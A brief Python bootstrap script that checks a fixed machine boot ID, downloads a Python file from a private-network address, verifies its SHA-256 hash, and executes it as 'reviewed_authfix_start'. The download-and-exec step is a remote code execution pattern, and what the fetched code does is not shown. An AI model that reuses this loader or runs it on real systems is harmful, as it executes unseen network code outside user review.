import hashlib,urllib.request
from pathlib import Path
assert Path('/proc/sys/kernel/random/boot_id').read_text().strip()=='b0718166-5c3b-4c4f-b669-4f83d3340d00'
b=urllib.request.urlopen('http://192.168.2.1:8765/start.py',timeout=15).read(65536)
assert hashlib.sha256(b).hexdigest()=='df6593844cacc2fd00d2e3180a0dc4ee5e1c14a89ab152ed48c8a0573193d8e5'
exec(compile(b,'reviewed_authfix_start','exec'))
